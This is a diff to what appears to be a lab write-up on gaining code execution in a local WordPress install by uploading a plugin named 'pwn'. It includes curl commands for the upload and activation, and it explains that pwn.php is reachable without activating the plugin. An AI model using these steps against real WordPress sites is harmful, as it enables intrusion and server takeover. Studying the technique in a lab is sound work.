@@ -200,8 +200,12 @@ curl -s -b cookies.txt 'http://localhost:8091/wp-admin/update.php?action=upload-
      -F "install-plugin-submit=Install Now"
 ```
 
-The response includes a "Activate Plugin" link — follow it (or extract
-its `_wpnonce` and call directly):
+The response includes an "Activate Plugin" link. You **don't actually
+need to activate** — the zip is extracted into `wp-content/plugins/pwn/`
+the moment the upload succeeds, and `pwn.php` is reachable at its URL
+right away. WordPress only enforces "active" status for hook execution;
+direct file requests bypass that. Activation is harmless if you want to
+go through the motions:
 ```bash
 curl -b cookies.txt 'http://localhost:8091/wp-admin/plugins.php?action=activate&plugin=pwn/pwn.php&_wpnonce=...'
 ```
